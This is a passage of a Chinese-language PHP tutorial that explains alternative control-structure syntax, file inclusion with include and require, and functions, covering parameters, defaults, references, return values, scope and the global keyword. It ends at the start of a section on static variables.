<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//需求：打印一个九九乘法表，使用表格来展示</span></span><br><span class="line">&lt;table border=<span class="number">1</span>&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">1</span>;<span class="variable">$i</span> &lt;= <span class="number">9</span>;<span class="variable">$i</span>++)&#123;<span class="meta">?&gt;</span></span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">    	<span class="meta">&lt;?php</span> <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">1</span>;<span class="variable">$j</span> &lt;= <span class="variable">$i</span>;<span class="variable">$j</span>++)&#123;<span class="meta">?&gt;</span></span><br><span class="line">        &lt;td&gt;</span><br><span class="line">        	<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$i</span> . <span class="string">&#x27;*&#x27;</span> . <span class="variable">$j</span> . <span class="string">&#x27;=&#x27;</span> . <span class="variable">$i</span>*<span class="variable">$j</span>;<span class="meta">?&gt;</span></span><br><span class="line">        &lt;/td&gt;</span><br><span class="line">        <span class="meta">&lt;?php</span> &#125;<span class="meta">?&gt;</span></span><br><span class="line">    &lt;/tr&gt;		</span><br><span class="line">    <span class="meta">&lt;?php</span> &#125;<span class="meta">?&gt;</span></span><br><span class="line">&lt;/table&gt;</span><br></pre></td></tr></table></figure>
<p>再PHP书写到HTML中的这些大括号{}非常不美观，所以PHP提供了一种替代即使，让其可以不用书写大括号：</p>
<p>​    for(;;){ ==&gt;fot(;;):</p>
<p>​    }        ==&gt;endfor;</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//需求：打印一个九九乘法表，使用表格来展示</span></span><br><span class="line">&lt;table border=<span class="number">1</span>&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">1</span>;<span class="variable">$i</span> &lt;= <span class="number">9</span>;<span class="variable">$i</span>++):<span class="meta">?&gt;</span></span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">    	<span class="meta">&lt;?php</span> <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">1</span>;<span class="variable">$j</span> &lt;= <span class="variable">$i</span>;<span class="variable">$j</span>++):<span class="meta">?&gt;</span></span><br><span class="line">        &lt;td&gt;</span><br><span class="line">        	<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$i</span> . <span class="string">&#x27;*&#x27;</span> . <span class="variable">$j</span> . <span class="string">&#x27;=&#x27;</span> . <span class="variable">$i</span>*<span class="variable">$j</span>;<span class="meta">?&gt;</span></span><br><span class="line">        &lt;/td&gt;</span><br><span class="line">        <span class="meta">&lt;?php</span> <span class="keyword">endfor</span>;<span class="meta">?&gt;</span></span><br><span class="line">    &lt;/tr&gt;		</span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">endfor</span>;<span class="meta">?&gt;</span></span><br><span class="line">&lt;/table&gt;</span><br></pre></td></tr></table></figure>
<p>PHP中具体有那些替代语法呢？PHP应该再HTML中只做数据输出，输出通常伴有条件判断和循环操作，因此PHP提供了对应分支结构和循环结构的代替语法：全部都是对应的一个模式：</p>
<p>​    左大括号{使用冒号替代:</p>
<p>​    又大括号}使用end+对应的起始标记替代</p>
<p>if：if():        endif;</p>
<p>switch：switch():        endswitch;</p>
<p>for：for(;;):        endfor;</p>
<p>while：while():        endwhile;</p>
<p>foreach：foreach():        endforeach;</p>
<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>文件包含：在一个PHP脚本中，去将另外一个文件（PHP）包含进来，去合作完成一件事情。</p>
<h3 id="文件包含的作用"><a href="#文件包含的作用" class="headerlink" title="文件包含的作用"></a>文件包含的作用</h3><p>文件包含的意义：</p>
<p>​    1、要么使用被包含文件中的内容，实现代码的共享（重用）：向上包含（索要）</p>
<p>​    向上包含：在当前脚本要用某个代码之前包含别的文件</p>
<p>​    2、要么自己有东西可以给别的文件使用，实现代码的共享（重用）：向下包含（给与）</p>
<p>​    向下包含：在自己又某个东西的时候，需要别的脚本来显示（自己代码写完之后包含其他文件）</p>
<p>最大的作用：分工写作，每个脚本做的事情不一样，因此可以使用写作方式，让多个脚本共同完成意见事情。</p>
<h3 id="文件包含四种形式"><a href="#文件包含四种形式" class="headerlink" title="文件包含四种形式"></a>文件包含四种形式</h3><p>在PHP中文件的包含有四种形式（两种大形式）</p>
<p>include：包含文件</p>
<p>include_once：系统会自动判断文件包含过程中，是否已经包含过（一个文件最多被包含一次）</p>
<p>require：与include相同</p>
<p>require_once：与include_once相同</p>
<p>包含基本语法：</p>
<p>include ‘文件名字’;</p>
<p>include(‘文件名字’);        //文件名字：路径问题</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//include1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">//被包含文件</span></span><br><span class="line">    <span class="comment">//定义数据</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="number">1</span>;</span><br><span class="line">	define(<span class="string">&#x27;PI&#x27;</span>,<span class="number">3.14</span>);</span><br><span class="line">	<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//include2.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//包含文件：使用数据</span></span><br><span class="line">    <span class="comment">//包含文件</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;include1.php&#x27;</span>;		<span class="comment">//包含当前文件include2.php所在文件夹下的include1.php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>,PI;</span><br><span class="line">	<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>以上方式：是先包含文件，后使用文件中的内容（向上包含）</p>
<p>向下包含：先准备内容，然后包含另外的文件，在另外的文件中，使用当前的内容</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//include3.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//定义数据</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="number">1</span>;</span><br><span class="line">	define(<span class="string">&#x27;PI&#x27;</span>,<span class="number">3.14</span>);</span><br><span class="line">	<span class="comment">//包含文件：为了显示以上数据</span></span><br><span class="line">	<span class="keyword">include_once</span> <span class="string">&#x27;include4.php&#x27;</span>;</span><br><span class="line">	<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//include4.php</span></span><br><span class="line">&lt;table&gt;</span><br><span class="line">	&lt;tr&gt;</span><br><span class="line">        &lt;td&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$a</span>;<span class="meta">?&gt;</span>&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> PI;<span class="meta">?&gt;</span>&lt;/td&gt;</span><br><span class="line">&lt;/table&gt;</span><br></pre></td></tr></table></figure>


<h3 id="文件加载原理"><a href="#文件加载原理" class="headerlink" title="文件加载原理"></a>文件加载原理</h3><p>PHP代码的执行流程</p>
<p>​    1、读取代码文件（PHP文件）</p>
<p>​    2、编译：将PHP代码转换成字节码（生成opcode）</p>
<p>​    3、zendengine来计息opcode，按照字节码去进行逻辑运算</p>
<p>​    4、转换成对应的HTML代码</p>
<p>文件加载原理：</p>
<p>​    1、在文件加载（include或者require）的时候，系统会自动的将将被包含文件中的代码相当于嵌入到当前文件中</p>
<p>​    2、加载位置：在哪加载，对应的文件中的代码嵌入的位置就是对应的include位置</p>
<p>​    3、在PHP中被包含的文件是单独进行编译的</p>
<p>PHP文件在编译的过程中如果出现了语法错误，那么会失败（不会执行）；但是如果被包含文件有错误的时候，系统会在执行到包含include这条语句的时候才会报错。</p>
<h3 id="inclde和require区别"><a href="#inclde和require区别" class="headerlink" title="inclde和require区别"></a>inclde和require区别</h3><p>include和include_once的区别：</p>
<p>​    include系统会碰到一次，执行一次；如果对同一个文件进行多次加载，那么系统会执行多次；</p>
<p>​    include_once：系统碰到多次，也只会执行一次</p>
<p>require和include的区别：本质都是包含文件，唯一的区别在于包含不到文件的时候，报错的形式不一样</p>
<p>​    include的错误级别较轻：不会阻止代码执行</p>
<p>​    require要求较高：如果包含出错代码不再执行（require后面的代码）</p>
<h3 id="文件加载路径"><a href="#文件加载路径" class="headerlink" title="文件加载路径"></a>文件加载路径</h3><p>文件在加载的收需要指定文件路径才能保证PHP正确的找到对应的文件。</p>
<p>文件的加载路径包含两大类：</p>
<p>​    1、绝对路径</p>
<p>​        从磁盘的根目录开始（本地绝对路径）</p>
<p>​            windows：盘符c:/路径/PHP文件</p>
<p>​            linux：/路径/PHP文件</p>
<p>​        从网站根目录开始（网络绝对路径）</p>
<p>​            /：相对于网站主机名字对应的路径</p>
<p>​    2、相对路径：从当前文件所在目录开始的路径</p>
<p>​    .|./：表示当前文件夹</p>
<p>​    ../：上级目录（当前文件夹的上一层文件夹）</p>
<p>绝对路径和相对路径的加载区别</p>
<p>​    1、绝对路径相对相率偏低，但是相对安全（路径不会出问题）</p>
<p>​    2、相对路径相对效率较高，但是容易出错（相对路径会发生改变）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//PHP文件加载路径</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//相对路径加载</span></span><br><span class="line">    <span class="keyword">include_once</span> <span class="string">&#x27;include1.php&#x27;</span>;	<span class="comment">//默认当前文件本身</span></span><br><span class="line">	<span class="keyword">include_once</span> <span class="string">&#x27;./include1.php&#x27;</span>;  </span><br><span class="line">	<span class="comment">//复杂相对路径</span></span><br><span class="line">	<span class="keyword">include_once</span> <span class="string">&#x27;../www/include1.php&#x27;</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//绝对路径</span></span><br><span class="line">	<span class="keyword">include_once</span> <span class="string">&#x27;D:\Service\phpstudy_pro\WWW\include1.php&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<h3 id="文件嵌套包含"><a href="#文件嵌套包含" class="headerlink" title="文件嵌套包含"></a>文件嵌套包含</h3><p>文件嵌套包含：一个文件包含另外一个文件，同时被包含的文件又包含了另外一个文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//文件嵌套包含</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//包含include3.php//文件本身包含了Include4.php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;include3.php&#x27;</span>;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>嵌套包含的时候就很容易出现相对路径出错的问题：相对路径会因为文件的包含而改变（./和../）：windows下面，每一个文件夹下都有.和..的文件夹。</p>
<p>举例：张三左边是李四，李四左边是王五</p>
<p>张三把李四叫到自己的位置：李四与王五之间又两个位置，李四如果还按照左边伸手找王五就找不到</p>
<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="函数的基本概念"><a href="#函数的基本概念" class="headerlink" title="函数的基本概念"></a>函数的基本概念</h3><p>函数：function，是一种语法结构，将实现某一功能的代码块（多行代码）封装到一个结构中，从而实现代码的重复利用（复用）。</p>
<h3 id="函数定义语法"><a href="#函数定义语法" class="headerlink" title="函数定义语法"></a>函数定义语法</h3><p>函数又几个对应的关键点：function关键字、函数名、参数（形参和实参）、函数体和返回值。</p>
<p>基本语法如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> 函数名(<span class="params">[参数]</span>)</span>&#123;</span><br><span class="line">    <span class="comment">//函数体</span></span><br><span class="line">    <span class="comment">//返回值：return 结果；</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>定义函数的目的：是为了实现代码的重复利用，一个功能一个函数（简单明了）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//定义函数</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    	<span class="comment">//函数体</span></span><br><span class="line">    	<span class="keyword">echo</span> <span class="string">&#x27;hello world&#x27;</span>;		<span class="comment">//没有返回值</span></span><br><span class="line">&#125;</span><br><span class="line">	<span class="comment">//调用函数</span></span><br><span class="line">	display();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>函数的使用：通过访问函数的名字+()；    //如果函数在定义的过程中又参数，那么在调用的时候就必须传入对应的参数：函数是一种结构不会自动运行，必须通过调用才会执行。</p>
<p>函数是在代码执行阶段，碰到函数名字的时候才会嗲用，不是在编译阶段。</p>
<p>函数的调用特点：只要系统在内存中能够找到对应的函数，就可以执行（函数的调用可以在函数定义之前）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//调用函数</span></span><br><span class="line">	display();</span><br><span class="line">    <span class="comment">//定义函数</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    	<span class="comment">//函数体</span></span><br><span class="line">    	<span class="keyword">echo</span> <span class="string">&#x27;hello world&#x27;</span>;		<span class="comment">//没有返回值</span></span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>函数执行的内存分析：</p>
<p>​    1、读取代码进入到代码段（编译：将代码变成字节码存储到内容）</p>
<p>​    2、根据代码逐行执行</p>
<p>以上原因：编译和执行是分开的（先编译再执行）</p>
<h3 id="函数命名规范"><a href="#函数命名规范" class="headerlink" title="函数命名规范"></a>函数命名规范</h3><p>命名规范：由字母、数字和下划线组成，但是不能以数字开头</p>
<p>函数作为一种常用的结构，一般遵循以下规则：函数通常代表着函数的功能，而有些功能会比较复杂，可能一个单词不足以表达，需要多个组合。</p>
<p>​    1、驼峰法：除了左边第一个单词外，后面所有单词首字母都大写：showParentInfo()</p>
<p>​    2、下划线法：单词之间通过下划线连接，单词都是小写：show_parent_info()</p>
<p>函数名字：在一个脚本周期中，不允许出现同名函数（通常在一个系统开发中都不会使用同名函数）</p>
<h3 id="参数详解"><a href="#参数详解" class="headerlink" title="参数详解"></a>参数详解</h3><p>函数的参数分为两种：形参和实参</p>
<h4 id="形参"><a href="#形参" class="headerlink" title="形参"></a>形参</h4><p>形参：形式参数，不具有实际意义的参数，实在函数定义时使用的参数</p>
<h4 id="实参"><a href="#实参" class="headerlink" title="实参"></a>实参</h4><p>实参：实际参数，具有实际数据意义的参数，是在函数调用时使用的参数</p>
<p>形参是实参的载体：实参在调用时通常是需要传入到函数内部参与计算（运算），那么需要在函数内部去找到实际数据所在的位置才能找到数据本身：需要实际调用的时候，将数据以实参的形式传递给形参：给形参赋值，从而使得函数内部可以用到外部数据。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//定义函数</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span>&#123;		<span class="comment">//形参可以有多个，使用逗号分隔即可</span></span><br><span class="line">    	<span class="comment">//函数体：可以直接使用形参运算</span></span><br><span class="line">    	<span class="keyword">echo</span> <span class="variable">$arg1</span> + <span class="variable">$arg2</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//调用函数</span></span><br><span class="line">	<span class="variable">$num1</span> = <span class="number">10</span>;</span><br><span class="line">	add(<span class="variable">$num1</span>,<span class="number">20</span>);		<span class="comment">//传入的实参，可以是变量或者其他有值的表达式（变量、常量、运算符计算结果）</span></span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>以上函数执行过程：</p>
<p>​    1、系统调用add函数：去内存中寻找是否有add函数：有</p>
<p>​    2、系统会在栈区开辟内存空间运行函数add</p>
<p>​    3、系统会查看函数本身是否有形参：有，两个</p>
<p>​    4、系统会判断调用的时候是否有实参：有，两个</p>
<p>​    5、系统默认会将实参的值$num1，20取出顺序赋值给形参：$arg1和$arg2</p>
<p>​    6、执行函数体：运行</p>
<p>​    7、返回函数执行（返回值）</p>
<p>注意事项：</p>
<p>​    1、在PHP中允许实参多于形参（个数）：函数内部不用而已</p>
<p>​    2、在PHP中理论上形参个数没有限制（实际开发不会太多）</p>
<p>​    3、实参不能少于形参个数</p>
<h4 id="默认值"><a href="#默认值" class="headerlink" title="默认值"></a>默认值</h4><p>默认值：default value，指的是形参的默认值，在函数定义的时候，就给形参进行一个初始赋值：如实际调用传入的参数（实参）没有提供，那么形参就会使用定义时的值来进入函数内部参与运算。</p>
<p>通常默认值是用在一些，一定会有某个数据参与，但是可能通常是某个我们知道的值。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//函数的默认值</span></span><br><span class="line"><span class="variable">$num1</span> = <span class="number">10</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sub</span>(<span class="params"><span class="variable">$num1</span> = <span class="number">0</span>,<span class="variable">$num2</span> = <span class="number">0</span></span>)</span>&#123;		<span class="comment">//当前的$num1是形参，在编译时不执行，即便执行也是在sub函数内部，不会与外部的$num1变量冲突</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$num1</span> - <span class="variable">$num2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//调用：默认值如果存在，可以不用传入</span></span><br><span class="line">sub(<span class="variable">$num1</span>);		<span class="comment">//10</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$num1</span>;		<span class="comment">//10</span></span><br></pre></td></tr></table></figure>
<p>注意事项：</p>
<p>​    1、默认值的定义是放在最右边的（多个），不能左边形参有默认值，但是右边没有</p>
<p>函数外部定义的变量名字与函数定义的形参名字冲突（同名）是没有任何关联关系的；如果多个函数使用同样的形参名字也不冲突。</p>
<h4 id="引用传递"><a href="#引用传递" class="headerlink" title="引用传递"></a>引用传递</h4><p>实参在调用是会将赋值给形参，实际上使用的方式就是一种简单的值传递：将实参（如果是变量或者常量或者其他表达式）的结果（值）取出来赋值给形参：形参与外部实际传入的参数本身没有任何关联关系：只是结果一样。</p>
<p>有的时候，希望在函数内部拿到的外部数据，能够在函数内部改变，那么就需要明确告知函数（定义时），函数才会在调用的时候去主动获取外部数据的内存地址。以上这种定义形式叫做引用传值。</p>
<p>基本定义语法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> 函数名(<span class="params">形参<span class="number">1</span>,&amp;形参<span class="number">2</span></span>)</span>&#123;</span><br><span class="line">	<span class="comment">//函数体</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在调用的时候，必须给引用传值的参数位置传入实际参数，而且参数本身必须是变量。（变量才有只想的数据的内存地址）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//引用传值</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params"><span class="variable">$a</span>,&amp;<span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">	<span class="comment">//修改形参的值</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="variable">$a</span> * <span class="variable">$a</span>;</span><br><span class="line">    <span class="variable">$b</span> = <span class="variable">$b</span> * <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>,<span class="string">&#x27;&lt;br/&gt;&#x27;</span>,<span class="variable">$b</span>,<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;		<span class="comment">//100,25</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//定义变量</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">10</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="number">5</span>;</span><br><span class="line"><span class="comment">//调用函数</span></span><br><span class="line">display(<span class="variable">$a</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr/&gt;&#x27;</span>,<span class="variable">$a</span>,<span class="string">&#x27;&lt;br/&gt;&#x27;</span>,<span class="variable">$b</span>,<span class="string">&#x27;&lt;br/&gt;&#x27;</span>; 		<span class="comment">//10,25</span></span><br><span class="line"><span class="comment">//错误调用：引用传值直接传入数据本身而不是变量</span></span><br><span class="line">display(<span class="number">10</span>,<span class="number">5</span>);		<span class="comment">//报错</span></span><br></pre></td></tr></table></figure>
<p>说明：函数在定义的时候，对应的b形参采用的是取地址；所以在实参传入之后，系统b取到了外部变量b的内存地址，而a取得是值；因此改变之后：a只改变了函数内部自己，b改变自己得同时也改变了外部。</p>
<p>引用传值注意事项：在传入实参的时候，必须传入变量</p>
<h3 id="函数体"><a href="#函数体" class="headerlink" title="函数体"></a>函数体</h3><p>函数体：函数内部（大括号{}里面）的所有代码都称之为函数体</p>
<p>函数体：基本上所有的代码哦都可以实现</p>
<p>​    1、定义变量</p>
<p>​    2、定义常量</p>
<p>​    3、使用流程控制（分支、循环）</p>
<p>​    4、可以调用函数</p>
<h3 id="函数返回值"><a href="#函数返回值" class="headerlink" title="函数返回值"></a>函数返回值</h3><p>返回值：return，指的是将函数实现的结果，通过return关键字，返回给函数外部（函数调用处）；在PHP中所有的函数都有返回值。（如果没有明确return使用，那么系统默认返回NULL）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//定义函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//输出</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="keyword">__FUNCTION__</span>;		<span class="comment">//输出当前函数的名字</span></span><br><span class="line">&#125;</span><br><span class="line">var_dump(display());		<span class="comment">//display，NULL</span></span><br></pre></td></tr></table></figure>
<p>返回值作用：将计算结果返回给调用处</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//function.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"><span class="variable">$num1</span>,<span class="variable">$num2</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$num1</span> + <span class="variable">$num2</span>;	<span class="comment">//返回结果</span></span><br><span class="line">    <span class="comment">//输出</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$num1</span>;		<span class="comment">//retuen直接结束函数，后面的内容都不会执行</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$res</span> = add(<span class="number">10</span>,<span class="number">20</span>);		<span class="comment">//外部定义变量接受函数运行结果</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$res</span>;		<span class="comment">//30</span></span><br><span class="line">	<span class="comment">//将结果提交给另外包含的文件</span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">&#x27;hello world&#x27;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$res</span>;		<span class="comment">//不再执行，原因：return结束了</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>注意：函数的返回值可以是任意数据类型</p>
<p>return关键字：</p>
<p>​    1、return在函数内部存在的价值：返回当前函数的结果（当前函数运行结束）</p>
<p>​    2、return还可以在文件中直接使用（不再函数里面）：代表文件将结果return后面跟的内容，转交给包含当前文件的位置。（通常在系统配置文件中使用较多），在文件中也代表终止文件后面的代码：return之后的内容不再执行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//function_include.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">//包含有return关键之的文件</span></span><br><span class="line">	<span class="keyword">include_once</span> <span class="string">&#x27;function.php&#x27;</span>;		<span class="comment">//30</span></span><br><span class="line">	var_dump(<span class="variable">$res</span>);		<span class="comment">//string(11)&quot;hello world&quot;</span></span><br></pre></td></tr></table></figure>


<h3 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h3><p>作用域：变量（常量）能够被访问的区域</p>
<p>​    1、变量可以在普通代码中定义</p>
<p>​    2、变量也可以在函数内部定义</p>
<p>在PHP中作用域严格来说分为两种：但是PHP内部还定义一些在严格意义之外的一种，所以总共算三种：</p>
<p>​    1、全局变量：就是用户普通定义的变量（函数外部定义）</p>
<p>​        所属全局空间：在PHP中只允许在全局空间使用：理论上函数内部不可使用</p>
<p>​        脚本周期：知道脚本运行结束（最后一行代码执行完）</p>
<p>​    2、局部变量：就是在函数内部定义的变量</p>
<p>​        所属当前函数空间：在PHP中只允许当前函数自己内部使用</p>
<p>​        函数周期：函数执行结束（函数实在栈区中开辟独立内存空间运行）</p>
<p>​    3、超全局变量：系统定义的变量（预定义变量：$_SERVER、$_POST等）</p>
<p>​        所属超全局空间：没有访问限制（函数内外都可以访问）</p>
<p>​        超全局变量会将全局变量自动纳入到$GLOBALS里面，而$GLOBALS没有作用域限制，所以能够帮助局部去访问全局变量：但是碧血使用数组方式</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//默认代码空间：全局空间</span></span><br><span class="line">    <span class="variable">$global</span> = <span class="string">&#x27;global area&#x27;</span>;		<span class="comment">//最终会被系统纳入到超全局变量中：$GLOBALS[&#x27;global&#x27;] = global area；</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">//局部变量（函数内部定义）</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//所有形参都可以理解为局部变量</span></span><br><span class="line">        <span class="variable">$inner</span> = <span class="keyword">__FUNCTION__</span>;		<span class="comment">//局部变量</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//访问全局变量</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$global</span>;		<span class="comment">//报错</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//访问全局变量</span></span><br><span class="line">        var_dump(<span class="variable">$GLOBALS</span>);		<span class="comment">//可以访问</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$GLOBALS</span>[<span class="string">&#x27;global&#x27;</span>];		<span class="comment">//global area</span></span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">//调用函数</span></span><br><span class="line">	display();</span><br><span class="line">	<span class="comment">//全局空间访问局部变量</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$inner</span>;		<span class="comment">//报错</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>如果想函数内部使用外部变量：除了$GLOBALS之外，通过参数传值（如果要统一战线还可以使用引用传值）。</p>
<p>在PHP中，其实还有一种方式，能够实现全局发访问局部，同时局部也可以访问全局：global关键字</p>
<p>global关键字：是一种还函数里面定义变量的一种方式</p>
<p>​    1、如果使用global定义的变量名在外部存在（全局变量），那么系统在函数内部定义的变量直接指向外部全局变量所指向的内存空间（同一个变量）；</p>
<p>​    2、如果使用global定义的变量名在外部不存在（全局变量），系统会自动在全局空间（外部）定义一个与局部变量同名的全局变量</p>
<p>本质的形式：在函数的内部和外部，对一个同名变量（全局和局部）使用同意狂内存地址保存数据，从而实现共同拥有。</p>
<p>基本语法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">global</span> 变量名;		<span class="comment">//不能赋值</span></span><br><span class="line">变量名 = 值;		<span class="comment">//修改</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$global</span> = <span class="string">&#x27;global area&#x27;</span>;	</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//所有形参都可以理解为局部变量</span></span><br><span class="line">    <span class="variable">$inner</span> = <span class="keyword">__FUNCTION__</span>;		<span class="comment">//局部变量</span></span><br><span class="line">        </span><br><span class="line">    <span class="comment">//定义变量：使用全局变量</span></span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$global</span>;		<span class="comment">//全局空间存在</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$global</span>;		<span class="comment">//global area</span></span><br><span class="line">    <span class="comment">//定义变量：全局不存在</span></span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$local</span>;</span><br><span class="line">    <span class="variable">$local</span> = <span class="string">&#x27;inner&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//访问“局部”变量</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$local</span>;		<span class="comment">//inner</span></span><br></pre></td></tr></table></figure>
<p>虽然以上方式可以实现局部与全局的互访，但是通常不会这么用。一般如果会存在特殊使用，也会使用参数的形式来访问。（还可以使用常量：define定义的）</p>
<h3 id="静态变量"><a href="#静态变量" class="headerlink" title="静态变量"></a>静态变量</h3><p>静态变量：static，是在函数内部定义的变量，使用static关键字修饰，用来实现跨函数共享数据的变量：函数运行结束所有全局变量都会清空，如果重新运行以下函数，所有的局部变量优惠重新初始化。</p>
<p>基本语法：</p>
